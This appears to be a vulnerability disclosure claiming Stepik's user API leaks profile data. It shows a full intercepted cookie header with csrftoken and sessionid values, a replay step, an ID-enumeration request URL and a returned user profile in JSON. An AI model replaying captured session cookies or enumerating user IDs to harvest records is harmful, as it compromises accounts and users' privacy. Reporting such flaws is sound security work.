# About stepik Website Information Disclosure Security Vulnerability Description

## 1 Security vulnerability implementation steps 
### 1.1 Get Header request data
Intercept browser Cookie information after logging in by a valid user.
```
Cookie:_gcl_au=1.1.1747595296.1712112618; _ga=GA1.1.798936669.1712112619; tmr_lvid=378dbb1b97b591b8fd28fb0e5333fb36; tmr_lvidTS=1712112621725; domain_sid=1JL1GbHhttRi4F2LzyGkj%3A1712112623830; _ym_uid=1712112627927153264; _ym_d=1712112627; _ym_isad=2; csrftoken=A4p2xExmNMuzxPXU2iuEsLFRueRSxVaaAvS4iAdpBfMTuG2sm12iRsC9qPiMnz4a; sessionid=w4w01bv7ymr4c2llamwt53fgaxh1mjnu; _ga_3YHTYDHHZK=GS1.1.1712120859.2.1.1712120862.57.0.0; _ym_visorc=w; tmr_detect=0%7C1712120871163
```

### 1.2 Add cookie to the replay attack HTTP Request Header

## 2 Disclosure of user information by replay attack

> Leaked information includes: username,city code,etc.

> Request method: GET, information can be obtained by traversing user ids[],such as "415832025","651763","37228178","470788160"...

API URL\application unit and request parameters of verified project information leakage are shown in the following table:

| authenticated user | API URL | Request params |
|---------|---|-----------|
|So Y|https://stepik.org/api/users?ids%5B%5D=415832025&ids%5B%5D=651763&ids%5B%5D=37228178&ids%5B%5D=470788160|ids%5B%5D=415832025ids%5B%5D=651763ids%5B%5D=37228178ids%5B%5D=470788160|



### Leaked packet cases 
``` 
{
            "id": 37228178,
            "profile": 37228178,
            "is_private": false,
            "is_active": true,
            "is_guest": false,
            "is_organization": false,
            "is_author": true,
            "short_bio": "Основатель и преподаватель онлайн-школы BEEGEEK.  Автор курсов \"Поколение Python\".",
            "details": "Цель образовательных курсов \"Поколение Python\" – сделать процесс обучения проще и эффективнее.\n<br>\n<br>\n\nНаш официальный сайт: <a href=\"https://pygen.ru\" rel=\"noopener noreferrer nofollow\" target=\"_ blank\">pygen.ru</a>.\n\n<br>\n\nНаш официальный telegram-канал: <a href=\"https://t.me/pygen_ru\" rel=\"noopener noreferrer nofollow\" target=\"_ blank\">t.me/pygen_ru</a>.\n\n<br>\n\nНаш официальный магазин мерча: <a href=\"https://shop.pygen.ru/\" rel=\"noopener noreferrer nofollow\" target=\"_ blank\">shop.pygen.ru</a>.\n<br>\n\nНаш официальный YouTube-канал: <a href=\"https://www.youtube.com/@pygen_ru\" rel=\"noopener noreferrer nofollow\" target=\"_ blank\">@pygen_ru</a>.\n\n<br>\n<br>\n\n<p style=\"text-align: right;\">❤️ Happy Pythoning! 🐍</p>",
            "first_name": "Тимур 🐍",
            "last_name": "Гуев",
            "full_name": "Тимур 🐍 Гуев",
            "alias": "tguev",
            "avatar": "https://cdn.stepik.net/media/users/37228178/avatar.png",
            "cover": null,
            "city": 524901,
            "knowledge": 361,
            "knowledge_rank": 316745,
            "reputation": 133235661,
            "reputation_rank": 1,
            "join_date": "2017-10-15T14:58:07Z",
            "social_profiles": [
                38488,
                38487,
                30727
            ],
            "solved_steps_count": 361,
            "created_courses_count": 21,
            "created_lessons_count": 4649,
            "issued_certificates_count": 169748,
            "followers_count": 1135089
        },
```